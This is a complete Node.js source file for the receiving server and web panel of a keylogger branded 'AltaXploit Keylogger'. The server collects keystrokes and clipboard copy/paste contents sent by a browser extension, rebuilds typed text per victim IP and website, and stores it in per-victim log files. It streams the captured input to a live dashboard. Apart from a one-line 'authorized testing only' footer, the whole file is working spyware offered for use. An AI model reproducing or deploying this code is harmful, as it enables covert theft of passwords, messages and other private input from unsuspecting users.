const WebSocket = require('ws');
const http = require('http');
const express = require('express');
const cors = require('cors');
const os = require('os');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    fg: {
        green: '\x1b[32m',
        yellow: '\x1b[33m',
        blue: '\x1b[34m',
        cyan: '\x1b[36m'
    },
    underscore: '\x1b[4m'
};

function printBanner() {
    console.clear();
    const banner = `
${colors.fg.cyan}${colors.bright}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗                                    
║                                                                                                          ║
║    _   _ _        __  __       _       _ _     _  __           _                                         ║
║   /_\\ | | |_ __ _\\ \\/ / _ __ | | ___ (_) |_  | |/ /___ _   _ | | ___   __ _  __ _  ___ _ __           ║
║  //_\\\\| | __/ _\` |\\  / | '_ \\| |/ _ \\| | __| | ' // _ \\ | | || |/ _ \\ / _\` |/ _\` |/ _ \\ '__|  ║                                         
║ /  _  \\ | || (_| |/  \\ | |_) | | (_) | | |_  | . \\  __/ |_| || | (_) | (_| | (_| |  __/ |             ║
║ \\_/ \\_/_|\\__\\__,_/_/\\_\\| .__/|_|\\___/|_|\\__| |_|\\_\\___|\\__, ||_|\\___/ \\__, |\\__, |\\___|_| ║  
║                       |_|                             |___/          |___/ |___/                         ║
║                                                                                                          ║                                    
║                                 ${colors.fg.yellow}🔥 AltaXploit Keylogger 🔥${colors.fg.cyan}           ║
║                                      ${colors.fg.green}Version 1.0.0${colors.fg.cyan}                    ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║  ${colors.fg.green}Developer: ${colors.fg.cyan}Muhammad Alwaz (AltaXploit)${colors.fg.cyan}                                      ║
║  ${colors.fg.green}GitHub:    ${colors.fg.blue}${colors.underscore}https://github.com/AltaXploit${colors.reset}${colors.fg.cyan} ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝
${colors.reset}`;
    console.log(banner);
}

printBanner();
// ========================
// Ensure logs directory exists
// ========================
const LOGS_DIR = path.join(__dirname, 'logs');
const RAW_LOGS_DIR = path.join(__dirname, 'raw_logs');
fs.mkdir(LOGS_DIR, { recursive: true }).catch(console.error);
fs.mkdir(RAW_LOGS_DIR, { recursive: true }).catch(console.error);

// ========================
// Helper: log to client-specific file
// ========================
async function logToFile(ip, entry) {
    const filePath = path.join(LOGS_DIR, `${ip}.txt`);
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const logLine = `[${timestamp}] ${entry}\n`;
    try {
        await fs.appendFile(filePath, logLine);
    } catch (err) {
        console.error(`Failed to write log for ${ip}:`, err);
    }
}

async function logRawKeystroke(ip, entry) {
    const filePath = path.join(RAW_LOGS_DIR, `${ip}_raw.txt`);
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const logLine = `[${timestamp}] ${entry}\n`;
    try {
        await fs.appendFile(filePath, logLine);
    } catch (err) {
        console.error(`Failed to write raw log for ${ip}:`, err);
    }
}

// ========================
// Data structures
// ========================
let keystrokeHistory = [];
let clipboardHistory = [];
let panelClients = [];
let extensionClients = new Map(); // ws -> { ip, connectedSince }

// For word grouping: Map key = `${ip}|${url}` -> { buffer: "", sentences: [], timer: null, allText: [] }
let typingSessions = new Map();

const MAX_HISTORY = 100;
const MAX_CLIPBOARD_HISTORY = 50;
const MAX_SENTENCES_PER_SESSION = 20;
const PAUSE_TIMEOUT = 2000; // 2 seconds

// ========================
// Serve the hacker panel (clean, bright, no glitch)
// ========================
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ AltaXploit Keylogger Panel ⚡</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0c0c0c;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            border: 2px solid #0f0;
            padding: 20px;
            box-shadow: 0 0 30px rgba(0,255,0,0.7);
            background: #111;
            border-radius: 8px;
        }
        h1 {
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
            margin-bottom: 10px;
            font-size: 2.8rem;
            letter-spacing: 4px;
            border-bottom: 2px solid #0f0;
            padding-bottom: 10px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #0f0; }
            to { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; }
        }
        .author {
            text-align: center;
            color: #0f0;
            margin-bottom: 20px;
            font-size: 1.2rem;
            border-bottom: 1px dashed #0f0;
            padding-bottom: 10px;
        }
        .author a {
            color: #0ff;
            text-decoration: none;
        }
        .author a:hover {
            text-decoration: underline;
            text-shadow: 0 0 5px #0ff;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: #1a1a1a;
            padding: 10px;
            border: 1px solid #0f0;
            margin-bottom: 20px;
            font-weight: bold;
            box-shadow: 0 0 10px rgba(0,255,0,0.5);
        }
        .status-item {
            color: #0f0;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.9; }
            50% { opacity: 1; text-shadow: 0 0 5px #0f0; }
            100% { opacity: 0.9; }
        }
        .live-feed, .clipboard-feed {
            background: #0a0a0a;
            border: 1px solid #0f0;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-size: 14px;
            margin-bottom: 30px;
            box-shadow: inset 0 0 15px rgba(0,255,0,0.3);
            border-radius: 4px;
        }
        .clipboard-feed {
            border-color: #fa0;
            box-shadow: inset 0 0 15px rgba(255,170,0,0.3);
        }
        .feed-entry, .clipboard-entry {
            margin: 5px 0;
            border-bottom: 1px dotted #2a2a2a;
            padding-bottom: 3px;
        }
        .timestamp {
            color: #ffaa00;
            margin-right: 10px;
        }
        .word {
            color: #00ffff;
            font-weight: bold;
            background: #1a1a1a;
            padding: 2px 6px;
            border-radius: 3px;
        }
        .clipboard-copy { color: #88ff88; font-weight: bold; }
        .clipboard-paste { color: #ff8888; font-weight: bold; }
        .url { color: #888; font-size: 0.9em; }
        .current-buffer {
            background: #112211;
            padding: 10px;
            border: 1px solid #0f0;
            margin-bottom: 20px;
            box-shadow: 0 0 10px #0f0;
            border-radius: 4px;
        }
        .buffer-text {
            color: #0f0;
            font-size: 18px;
            word-break: break-all;
        }
        .buffer-line {
            margin: 5px 0;
            border-left: 2px solid #0f0;
            padding-left: 10px;
        }
        .site { color: #ffaa00; }
        .clipboard-content {
            color: #ffffff;
            background: #2a2a2a;
            padding: 2px 8px;
            border-radius: 3px;
            max-width: 100%;
            overflow-x: auto;
            white-space: nowrap;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th {
            background: #1a1a1a;
            color: #0f0;
            padding: 10px;
            text-align: left;
            border: 1px solid #0f0;
        }
        td {
            padding: 8px;
            border: 1px solid #333;
        }
        tr:hover {
            background: #1f1f1f;
        }
        .client-table td {
            border-color: #0f0;
        }
        .commit-type {
            color: #ffaa00;
            font-size: 0.8em;
            margin-left: 10px;
        }
        .tab-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
        .tab-button {
            background: #1a1a1a;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px 15px;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.2s;
            border-radius: 4px;
        }
        .tab-button.active {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 10px #0f0;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #0f0;
            font-size: 12px;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ ALTA KEYLOGGER PANEL ⚡</h1>
        <div class="author">
            👤 Developer: <strong>Muhammad Alwaz</strong> | 
            🔗 <a href="https://github.com/AltaXploit" target="_blank">github.com/AltaXploit</a>
        </div>
        <div class="status-bar">
            <span class="status-item" id="connected-clients">🔌 Extensions: 0</span>
            <span class="status-item" id="keystroke-count">⌨️ Keystrokes: 0</span>
            <span class="status-item" id="clipboard-count">📋 Clipboard: 0</span>
            <span class="status-item" id="server-time"></span>
        </div>

        <div class="tab-buttons">
            <button class="tab-button active" onclick="showTab('keystrokes')">⌨️ KEYSTROKES</button>
            <button class="tab-button" onclick="showTab('clipboard')">📋 CLIPBOARD</button>
        </div>

        <!-- KEYSTROKES TAB -->
        <div id="tab-keystrokes" class="tab-content active">
            <h2>📝 CURRENT TYPING BUFFER (per site)</h2>
            <div id="current-buffers" class="current-buffer">
                <!-- will be filled by JS -->
            </div>

            <h2>📡 CAPTURED INPUT LOG</h2>
            <div class="live-feed" id="live-feed">
                <div class="feed-entry">[SYSTEM] Waiting for data...</div>
            </div>

            <h2>📜 RAW KEYSTROKE HISTORY (last 100)</h2>
            <table id="history-table">
                <thead><tr><th>Time</th><th>IP</th><th>Key</th><th>URL</th></tr></thead>
                <tbody><tr><td colspan="4">No data yet</td></tr></tbody>
            </table>
        </div>

        <!-- CLIPBOARD TAB -->
        <div id="tab-clipboard" class="tab-content">
            <h2>📋 CLIPBOARD ACTIVITY</h2>
            <div class="clipboard-feed" id="clipboard-feed">
                <div class="clipboard-entry">[SYSTEM] Waiting for clipboard data...</div>
            </div>

            <h2>📜 CLIPBOARD HISTORY (last 50)</h2>
            <table id="clipboard-table">
                <thead><tr><th>Time</th><th>IP</th><th>Action</th><th>Content</th><th>URL</th></tr></thead>
                <tbody><tr><td colspan="5">No data yet</td></tr></tbody>
            </table>
        </div>

        <h2>👤 CONNECTED EXTENSIONS</h2>
        <table class="client-table" id="client-table">
            <thead><tr><th>IP Address</th><th>Connected Since</th></tr></thead>
            <tbody></tbody>
        </table>
        <div class="footer">⚠️ FOR AUTHORIZED TESTING ONLY ⚠️</div>
    </div>
    <script>
        const ws = new WebSocket('ws://' + window.location.host);
        const liveFeed = document.getElementById('live-feed');
        const clipboardFeed = document.getElementById('clipboard-feed');
        const historyBody = document.querySelector('#history-table tbody');
        const clipboardBody = document.querySelector('#clipboard-table tbody');
        const clientBody = document.querySelector('#client-table tbody');
        const connectedSpan = document.getElementById('connected-clients');
        const keystrokeCountSpan = document.getElementById('keystroke-count');
        const clipboardCountSpan = document.getElementById('clipboard-count');
        const buffersDiv = document.getElementById('current-buffers');
        let totalKeystrokes = 0;
        let totalClipboard = 0;

        function formatTime(ts) { return new Date(ts).toLocaleTimeString() + '.' + new Date(ts).getMilliseconds(); }
        function escapeHtml(t) { 
            if (t === null || t === undefined) return '';
            let d = document.createElement('div'); 
            d.textContent = t; 
            return d.innerHTML; 
        }
        function truncate(str, len = 50) {
            if (!str) return '';
            return str.length > len ? str.substring(0, len) + '...' : str;
        }

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabName).classList.add('active');
            event.target.classList.add('active');
        }
        window.showTab = showTab;

        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            
            if (data.type === 'KEYSTROKE') {
                // Update raw history table
                const row = document.createElement('tr');
                row.innerHTML = \`<td>\${formatTime(data.timestamp)}</td><td>\${data.ip || 'N/A'}</td><td><span class="word">\${escapeHtml(data.key)}</span></td><td>\${escapeHtml(data.url)}</td>\`;
                historyBody.prepend(row);
                if (historyBody.children.length > 100) historyBody.removeChild(historyBody.lastChild);
                totalKeystrokes++;
                keystrokeCountSpan.innerText = '⌨️ Keystrokes: ' + totalKeystrokes;

                // If this keystroke triggered a commit, show it in live feed
                if (data.sentence) {
                    const feedDiv = document.createElement('div');
                    feedDiv.className = 'feed-entry';
                    const commitLabel = data.commitType === 'pause' ? '[PAUSE]' : (data.commitType === 'enter' ? '[ENTER]' : '[SPACE]');
                    feedDiv.innerHTML = \`<span class="timestamp">[\${formatTime(data.timestamp)}]</span> <span class="word">\${escapeHtml(data.sentence)}</span> <span class="commit-type">\${commitLabel}</span> @ <span class="url">\${escapeHtml(data.url)}</span>\`;
                    liveFeed.appendChild(feedDiv);
                    liveFeed.scrollTop = liveFeed.scrollHeight;
                    while (liveFeed.children.length > 50) liveFeed.removeChild(liveFeed.firstChild);
                }

                // Update current buffers display
                if (data.buffers) {
                    let html = '';
                    for (let [key, buf] of Object.entries(data.buffers)) {
                        const [ip, url] = key.split('|');
                        html += \`<div class="buffer-line"><span class="site">\${escapeHtml(ip)} @ \${escapeHtml(url)}:</span> <span class="buffer-text">"\${escapeHtml(buf)}"</span></div>\`;
                    }
                    buffersDiv.innerHTML = html || '<div>No active typing</div>';
                }
            }
            else if (data.type === 'CLIPBOARD') {
                // Update clipboard feed
                const feedDiv = document.createElement('div');
                feedDiv.className = 'clipboard-entry';
                const actionClass = data.action === 'copy' ? 'clipboard-copy' : 'clipboard-paste';
                const actionLabel = data.action === 'copy' ? '📋 COPY' : '📌 PASTE';
                feedDiv.innerHTML = \`<span class="timestamp">[\${formatTime(data.timestamp)}]</span> <span class="\${actionClass}">\${actionLabel}</span> <span class="clipboard-content">"\${escapeHtml(truncate(data.content, 100))}"</span> @ <span class="url">\${escapeHtml(data.url)}</span>\`;
                clipboardFeed.appendChild(feedDiv);
                clipboardFeed.scrollTop = clipboardFeed.scrollHeight;
                while (clipboardFeed.children.length > 30) clipboardFeed.removeChild(clipboardFeed.firstChild);

                // Update clipboard table
                const row = document.createElement('tr');
                row.innerHTML = \`<td>\${formatTime(data.timestamp)}</td><td>\${data.ip || 'N/A'}</td><td><span class="\${actionClass}">\${data.action.toUpperCase()}</span></td><td><span class="clipboard-content">"\${escapeHtml(truncate(data.content, 100))}"</span></td><td>\${escapeHtml(data.url)}</td>\`;
                clipboardBody.prepend(row);
                if (clipboardBody.children.length > 50) clipboardBody.removeChild(clipboardBody.lastChild);

                totalClipboard++;
                clipboardCountSpan.innerText = '📋 Clipboard: ' + totalClipboard;
            }
            else if (data.type === 'HISTORY') {
                // Load initial keystroke history
                historyBody.innerHTML = '';
                data.history.forEach(item => {
                    const row = document.createElement('tr');
                    row.innerHTML = \`<td>\${formatTime(item.timestamp)}</td><td>\${item.ip || 'N/A'}</td><td><span class="word">\${escapeHtml(item.key)}</span></td><td>\${escapeHtml(item.url)}</td>\`;
                    historyBody.appendChild(row);
                });
                totalKeystrokes = data.history.length;
                keystrokeCountSpan.innerText = '⌨️ Keystrokes: ' + totalKeystrokes;
            }
            else if (data.type === 'CLIPBOARD_HISTORY') {
                // Load initial clipboard history
                clipboardBody.innerHTML = '';
                data.history.forEach(item => {
                    const row = document.createElement('tr');
                    const actionClass = item.action === 'copy' ? 'clipboard-copy' : 'clipboard-paste';
                    row.innerHTML = \`<td>\${formatTime(item.timestamp)}</td><td>\${item.ip || 'N/A'}</td><td><span class="\${actionClass}">\${item.action.toUpperCase()}</span></td><td><span class="clipboard-content">"\${escapeHtml(truncate(item.content, 100))}"</span></td><td>\${escapeHtml(item.url)}</td>\`;
                    clipboardBody.appendChild(row);
                });
                totalClipboard = data.history.length;
                clipboardCountSpan.innerText = '📋 Clipboard: ' + totalClipboard;
            }
            else if (data.type === 'CLIENTS') {
                clientBody.innerHTML = '';
                data.clients.forEach(c => {
                    const row = document.createElement('tr');
                    row.innerHTML = \`<td>\${c.ip}</td><td>\${c.connectedSince || 'Just now'}</td>\`;
                    clientBody.appendChild(row);
                });
                connectedSpan.innerText = '🔌 Extensions: ' + data.clients.length;
            }
        };
        setInterval(() => { document.getElementById('server-time').innerText = new Date().toLocaleString(); }, 1000);
    </script>
</body>
</html>`);
});

// ========================
// Helper: commit a session's buffer to live feed and file
// ========================
function commitBuffer(sessionKey, reason = 'pause') {
    const session = typingSessions.get(sessionKey);
    if (!session || session.buffer.length === 0) return null;

    const completed = session.buffer;
    session.sentences.push(completed);
    if (session.sentences.length > MAX_SENTENCES_PER_SESSION) session.sentences.shift();
    session.allText.push(completed);
    session.buffer = '';

    const [ip, url] = sessionKey.split('|');
    return {
        sentence: completed,
        ip,
        url,
        timestamp: Date.now(),
        commitType: reason
    };
}

function getBuffersMap() {
    const buffers = {};
    for (let [key, session] of typingSessions.entries()) {
        buffers[key] = session.buffer;
    }
    return buffers;
}

// ========================
// WebSocket logic (with colored console output)
// ========================
wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress.replace('::ffff:', '');
    console.log(`${colors.fg.green}[+] New connection from ${colors.fg.cyan}${clientIp}${colors.reset}`);
    let isExtension = false;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'REGISTRATION' && data.client === 'chrome-extension') {
                isExtension = true;
                extensionClients.set(ws, {
                    ip: clientIp,
                    connectedSince: new Date().toLocaleString()
                });
                console.log(`${colors.fg.cyan}[✓] Extension registered from ${colors.fg.green}${clientIp}${colors.reset}`);
                broadcastClientList();
                logToFile(clientIp, `[CONNECTED]`);
                return;
            }
            
            if (data.type === 'KEYSTROKE') {
                data.ip = clientIp;
                keystrokeHistory.unshift(data);
                if (keystrokeHistory.length > MAX_HISTORY) keystrokeHistory.pop();
                logRawKeystroke(clientIp, `[KEYSTROKE] key='${data.key.replace(/'/g, "\\'")}' url='${data.url}'`);

                const sessionKey = `${clientIp}|${data.url}`;
                if (!typingSessions.has(sessionKey)) {
                    typingSessions.set(sessionKey, { buffer: '', sentences: [], timer: null, allText: [] });
                }
                const session = typingSessions.get(sessionKey);
                const key = data.key;

                if (session.timer) {
                    clearTimeout(session.timer);
                    session.timer = null;
                }

                let commitData = null;

                if (key === ' ') {
                    if (session.buffer.length > 0) {
                        commitData = {
                            sentence: session.buffer,
                            ip: clientIp,
                            url: data.url,
                            timestamp: Date.now(),
                            commitType: 'space'
                        };
                        session.sentences.push(session.buffer);
                        session.allText.push(session.buffer);
                        if (session.sentences.length > MAX_SENTENCES_PER_SESSION) session.sentences.shift();
                        session.buffer = '';
                    }
                } else if (key === 'Enter') {
                    if (session.buffer.length > 0) {
                        commitData = {
                            sentence: session.buffer + ' [ENTER]',
                            ip: clientIp,
                            url: data.url,
                            timestamp: Date.now(),
                            commitType: 'enter'
                        };
                        session.sentences.push(session.buffer);
                        session.allText.push(session.buffer);
                        session.sentences.push('[ENTER]');
                        session.allText.push('[ENTER]');
                        if (session.sentences.length > MAX_SENTENCES_PER_SESSION) session.sentences.shift();
                        session.buffer = '';
                    } else {
                        commitData = {
                            sentence: '[ENTER]',
                            ip: clientIp,
                            url: data.url,
                            timestamp: Date.now(),
                            commitType: 'enter'
                        };
                        session.sentences.push('[ENTER]');
                        session.allText.push('[ENTER]');
                    }
                } else if (key === 'Backspace') {
                    session.buffer = session.buffer.slice(0, -1);
                } else if (key.length === 1) {
                    session.buffer += key;
                }

                session.timer = setTimeout(() => {
                    const commit = commitBuffer(sessionKey, 'pause');
                    if (commit) {
                        logToFile(clientIp, `[TYPED] "${commit.sentence}" (${commit.commitType.toUpperCase()}) @ ${commit.url}`);
                        const enhancedCommit = { ...commit, type: 'KEYSTROKE', buffers: getBuffersMap() };
                        panelClients.forEach(client => {
                            if (client.readyState === WebSocket.OPEN) {
                                client.send(JSON.stringify(enhancedCommit));
                            }
                        });
                        console.log(`${colors.fg.yellow}[⏸] Pause committed: "${commit.sentence}" from ${clientIp}${colors.reset}`);
                    }
                    const sess = typingSessions.get(sessionKey);
                    if (sess) sess.timer = null;
                }, PAUSE_TIMEOUT);

                if (commitData) {
                    logToFile(clientIp, `[TYPED] "${commitData.sentence}" (${commitData.commitType.toUpperCase()}) @ ${commitData.url}`);
                }

                const buffers = getBuffersMap();
                const enhancedData = {
                    ...data,
                    sentence: commitData ? commitData.sentence : null,
                    commitType: commitData ? commitData.commitType : null,
                    buffers: buffers
                };
                panelClients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify(enhancedData));
                    }
                });

                // Optional: suppress per‑keystroke console spam
                // console.log(`⌨️ [${clientIp}] ${data.key} @ ${data.url} | buffer: "${session.buffer}"`);
            }
            
            if (data.type === 'CLIPBOARD') {
                data.ip = clientIp;
                clipboardHistory.unshift(data);
                if (clipboardHistory.length > MAX_CLIPBOARD_HISTORY) clipboardHistory.pop();
                const actionLabel = data.action === 'copy' ? 'COPY' : 'PASTE';
                logToFile(clientIp, `[CLIPBOARD] ${actionLabel}: "${data.content.replace(/"/g, '\\"')}" @ ${data.url}`);
                panelClients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify(data));
                    }
                });
                const icon = data.action === 'copy' ? '📋' : '📌';
                console.log(`${colors.fg.magenta}[${icon}] ${actionLabel} from ${clientIp}: ${data.content.substring(0, 50)}${data.content.length > 50 ? '...' : ''}${colors.reset}`);
            }
        } catch (e) { console.log('Invalid message:', message.toString()); }
    });

    ws.on('close', () => {
        if (isExtension) {
            (async () => {
                for (let [key, session] of typingSessions.entries()) {
                    if (key.startsWith(clientIp + '|')) {
                        const [ip, url] = key.split('|');
                        if (session.allText.length > 0) {
                            const fullText = session.allText.join(' ');
                            await logToFile(clientIp, `[SESSION SUMMARY] On ${url}: "${fullText}"`);
                        }
                        if (session.timer) clearTimeout(session.timer);
                        typingSessions.delete(key);
                    }
                }
                await logToFile(clientIp, `[DISCONNECTED]`);
            })();
            extensionClients.delete(ws);
            broadcastClientList();
            console.log(`${colors.fg.red}[-] Extension disconnected: ${clientIp}${colors.reset}`);
        } else {
            panelClients = panelClients.filter(c => c !== ws);
        }
    });

    panelClients.push(ws);
    ws.send(JSON.stringify({ type: 'HISTORY', history: keystrokeHistory }));
    ws.send(JSON.stringify({ type: 'CLIPBOARD_HISTORY', history: clipboardHistory }));
    sendClientList(ws);
});

function broadcastClientList() {
    const clients = Array.from(extensionClients.values());
    const msg = JSON.stringify({ type: 'CLIENTS', clients });
    panelClients.forEach(c => { if (c.readyState === WebSocket.OPEN) c.send(msg); });
}
function sendClientList(ws) {
    const clients = Array.from(extensionClients.values());
    ws.send(JSON.stringify({ type: 'CLIENTS', clients }));
}

// HTTP fallback
app.post('/api/keystrokes', (req, res) => {
    const data = req.body;
    data.ip = req.ip;
    
    if (data.type === 'KEYSTROKE') {
        keystrokeHistory.unshift(data);
        if (keystrokeHistory.length > MAX_HISTORY) keystrokeHistory.pop();
        logRawKeystroke(req.ip, `[KEYSTROKE] (HTTP) key='${data.key}' url='${data.url}'`);
    } else if (data.type === 'CLIPBOARD') {
        clipboardHistory.unshift(data);
        if (clipboardHistory.length > MAX_CLIPBOARD_HISTORY) clipboardHistory.pop();
        const actionLabel = data.action === 'copy' ? 'COPY' : 'PASTE';
        logToFile(req.ip, `[CLIPBOARD] ${actionLabel}: "${data.content}" @ ${data.url}`);
    }
    
    panelClients.forEach(c => { 
        if (c.readyState === WebSocket.OPEN) c.send(JSON.stringify(data)); 
    });
    res.json({ status: 'received' });
});

// ========================
// Start server with banner (no progress bar)
// ========================
printBanner();

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n${colors.fg.green}╔══════════════════════════════════════════════════════════════════╗`);
    console.log(`║  ${colors.fg.cyan}[+] Server URL:     ${colors.fg.yellow}http://localhost:${PORT}${colors.fg.green}                    ║`);
    console.log(`║  ${colors.fg.cyan}[+] LAN Access:     ${colors.fg.yellow}http://${os.networkInterfaces().eth0?.[0]?.address || 'YOUR_IP'}:${PORT}${colors.fg.green}          ║`);
    console.log(`║  ${colors.fg.cyan}[+] Logs Directory: ${colors.fg.yellow}${LOGS_DIR}${colors.fg.green}  ║`);
    console.log(`║  ${colors.fg.cyan}[+] Status:         ${colors.fg.green}READY 🔥${colors.fg.green}                                      ║`);
    console.log(`╚══════════════════════════════════════════════════════════════════╝${colors.reset}\n`);
});
